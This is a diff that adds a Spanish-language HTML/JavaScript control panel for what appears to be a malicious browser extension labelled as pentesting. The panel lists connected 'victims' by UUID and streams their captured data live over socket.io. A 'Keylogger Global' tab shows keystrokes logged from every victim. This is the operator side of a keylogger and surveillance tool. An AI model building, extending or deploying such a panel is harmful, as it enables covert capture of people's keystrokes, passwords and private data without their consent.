@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Panel de Control - Extensión Pentesting</title>
+<script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 20px;
+    background: #222;
+    color: #eee;
+  }
+  .tabs {
+    display: flex;
+    border-bottom: 2px solid #444;
+    margin-bottom: 20px;
+  }
+  .tab {
+    padding: 10px 15px;
+    cursor: pointer;
+    background: #333;
+    margin-right: 2px;
+    border-radius: 6px 6px 0 0;
+    user-select: none;
+  }
+  .tab.active {
+    background: #555;
+    font-weight: bold;
+  }
+  #contenido {
+    background: #333;
+    padding: 15px;
+    border-radius: 0 6px 6px 6px;
+    min-height: 300px;
+  }
+  .victima-list {
+    list-style: none;
+    padding: 0;
+  }
+  .victima-list li {
+    padding: 8px;
+    border-bottom: 1px solid #444;
+    display: flex;
+    justify-content: space-between;
+    cursor: pointer;
+  }
+  .victima-list li:hover {
+    background: #444;
+  }
+  .status {
+    font-weight: bold;
+  }
+  .status.activo {
+    color: #4caf50;
+  }
+  .status.inactivo {
+    color: #f44336;
+  }
+  pre {
+    background: #111;
+    padding: 8px;
+    border-radius: 4px;
+    overflow-x: auto;
+    max-height: 400px;
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+</style>
+</head>
+<body>
+<h1>Panel de Control - Extensión Pentesting</h1>
+
+<div class="tabs" id="tabs">
+  <div class="tab active" data-tab="victimas">Víctimas Conectadas</div>
+  <div class="tab" data-tab="keylogger">Keylogger Global</div>
+</div>
+
+<div id="contenido">
+  <p>Cargando víctimas...</p>
+</div>
+
+<script>
+  const socket = io();
+  const tabsContainer = document.getElementById('tabs');
+  const contenido = document.getElementById('contenido');
+
+  // Estado global
+  const victimas = {}; // uuid -> { datos: [], ultimaActividad: timestamp }
+  let tabSeleccionado = 'victimas';
+
+  // Función para mostrar la lista de víctimas con estado
+  function mostrarVictimas() {
+    if (Object.keys(victimas).length === 0) {
+      contenido.innerHTML = '<p>No hay víctimas conectadas.</p>';
+      return;
+    }
+    const ul = document.createElement('ul');
+    ul.className = 'victima-list';
+
+    const ahora = Date.now();
+    for (const uuid in victimas) {
+      const victima = victimas[uuid];
+      const activo = (ahora - victima.ultimaActividad) < 60000; // Activa si tiene datos en el último minuto
+
+      const li = document.createElement('li');
+      li.textContent = uuid;
+
+      const spanStatus = document.createElement('span');
+      spanStatus.className = 'status ' + (activo ? 'activo' : 'inactivo');
+      spanStatus.textContent = activo ? 'Activo' : 'Inactivo';
+
+      li.appendChild(spanStatus);
+
+      li.onclick = () => {
+        seleccionarTab(uuid);
+      };
+
+      ul.appendChild(li);
+    }
+    contenido.innerHTML = '';
+    contenido.appendChild(ul);
+  }
+
+  // Función para crear o seleccionar pestaña de víctima
+  function seleccionarTab(uuid) {
+    tabSeleccionado = uuid;
+
+    // Cambiar clase active de pestañas
+    Array.from(tabsContainer.children).forEach(tab => {
+      tab.classList.toggle('active', tab.dataset.tab === uuid);
+    });
+
+    // Si la pestaña no existe y no es 'victimas' o 'keylogger', crearla
+    if (!document.querySelector(`.tab[data-tab="${uuid}"]`) && uuid !== 'victimas' && uuid !== 'keylogger') {
+      const tab = document.createElement('div');
+      tab.className = 'tab active';
+      tab.dataset.tab = uuid;
+      tab.textContent = uuid;
+      tab.onclick = () => seleccionarTab(uuid);
+
+      tabsContainer.appendChild(tab);
+
+      // Quitar active de otras
+      Array.from(tabsContainer.children).forEach(t => {
+        if (t !== tab) t.classList.remove('active');
+      });
+    }
+
+    if (uuid === 'victimas') {
+      mostrarVictimas();
+    } else if (uuid === 'keylogger') {
+      mostrarKeyloggerGlobal();
+    } else {
+      mostrarDatosVictima(uuid);
+    }
+  }
+
+  // Función para mostrar datos de una víctima en el contenido
+  function mostrarDatosVictima(uuid) {
+    const victima = victimas[uuid];
+    if (!victima) {
+      contenido.innerHTML = `<p>No hay datos para la víctima ${uuid}</p>`;
+      return;
+    }
+
+    if (victima.datos.length === 0) {
+      contenido.innerHTML = `<p>No hay datos para la víctima ${uuid}</p>`;
+      return;
+    }
+
+    contenido.innerHTML = ''; // Limpiar
+
+    victima.datos.forEach(dato => {
+      const div = document.createElement('div');
+      div.style.marginBottom = '20px';
+
+      if (dato.tipo === 'keylogger') {
+        // Mostrar texto plano de teclas capturadas, con seguridad para HTML
+        const texto = dato.datos.keys || '';
+        div.innerHTML = `
+          <strong>Tipo:</strong> ${dato.tipo}<br>
+          <strong>Timestamp:</strong> ${new Date(dato.timestamp).toLocaleString()}<br>
+          <strong>Teclas registradas:</strong>
+          <pre>${texto.replace(/&/g, "&amp;").replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
+        `;
+      } else {
+        // Para otros tipos mostrar JSON formateado
+        const datosFormateados = JSON.stringify(dato.datos, null, 2);
+        div.innerHTML = `
+          <strong>Tipo:</strong> ${dato.tipo}<br>
+          <strong>Timestamp:</strong> ${new Date(dato.timestamp).toLocaleString()}<br>
+          <strong>Datos:</strong>
+          <pre>${datosFormateados}</pre>
+        `;
+      }
+
+      contenido.appendChild(div);
+    });
+  }
+
+  // Función para mostrar la pestaña "Keylogger Global"
+  function mostrarKeyloggerGlobal() {
+    let html = '';
+    // Recorremos todas las víctimas y sus datos keylogger
+    for (const uuid in victimas) {
+      const victima = victimas[uuid];
+      const keylogs = victima.datos.filter(d => d.tipo === 'keylogger');
+      if (keylogs.length === 0) continue;
+
+      html += `<h3>Víctima: ${uuid}</h3>`;
+      keylogs.forEach(dato => {
+        const keys = dato.datos.keys || '';
+        const fecha = new Date(dato.timestamp).toLocaleString();
+        html += `<div style="margin-bottom:10px;">
+                   <strong>${fecha}</strong>
+                   <pre>${keys.replace(/&/g, "&amp;").replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
+                 </div>`;
+      });
+    }
+    contenido.innerHTML = html || '<p>No hay datos de keylogger disponibles.</p>';
+  }
+
+  // Función para seleccionar la pestaña "Víctimas Conectadas"
+  function seleccionarTabVictimas() {
+    seleccionarTab('victimas');
+  }
+
+  // Función para seleccionar la pestaña "Keylogger Global"
+  function seleccionarTabKeylogger() {
+    seleccionarTab('keylogger');
+  }
+
+  // Cargar víctimas iniciales al abrir la página
+  async function cargarVictimas() {
+    const res = await fetch('/api/victimas');
+    const lista = await res.json();
+
+    lista.forEach(uuid => {
+      victimas[uuid] = { datos: [], ultimaActividad: 0 };
+    });
+
+    mostrarVictimas();
+  }
+
+  // Al recibir nuevos datos por socket
+  socket.on('nuevo_dato', (data) => {
+    const { uuid } = data;
+
+    if (!victimas[uuid]) {
+      victimas[uuid] = { datos: [], ultimaActividad: 0 };
+
+      // Crear pestaña para la nueva víctima si no existe
+      const existeTab = document.querySelector(`.tab[data-tab="${uuid}"]`);
+      if (!existeTab) {
+        const tab = document.createElement('div');
+        tab.className = 'tab';
+        tab.dataset.tab = uuid;
+        tab.textContent = uuid;
+        tab.onclick = () => seleccionarTab(uuid);
+        tabsContainer.appendChild(tab);
+      }
+
+      mostrarVictimas();
+    }
+
+    victimas[uuid].datos.unshift({
+      tipo: data.tipo,
+      datos: data.datos,
+      timestamp: data.timestamp,
+    });
+    victimas[uuid].ultimaActividad = Date.now();
+
+    // Refrescar vista según pestaña activa
+    if (tabSeleccionado === uuid) {
+      mostrarDatosVictima(uuid);
+    } else if (tabSeleccionado === 'victimas') {
+      mostrarVictimas();
+    } else if (tabSeleccionado === 'keylogger') {
+      mostrarKeyloggerGlobal();
+    }
+  });
+
+  // Listener para las pestañas "Víctimas Conectadas" y "Keylogger Global"
+  tabsContainer.addEventListener('click', (e) => {
+    if (e.target.classList.contains('tab')) {
+      if (e.target.dataset.tab === 'victimas') {
+        seleccionarTabVictimas();
+      } else if (e.target.dataset.tab === 'keylogger') {
+        seleccionarTabKeylogger();
+      }
+    }
+  });
+
+  // Inicializamos con pestaña de víctimas
+  cargarVictimas();
+  seleccionarTabVictimas();
+
+  // Refrescar estado víctimas inactivas cada 10s para actualizar colores
+  setInterval(() => {
+    if (tabSeleccionado === 'victimas') mostrarVictimas();
+  }, 10000);
+</script>
+
+</body>
+</html>
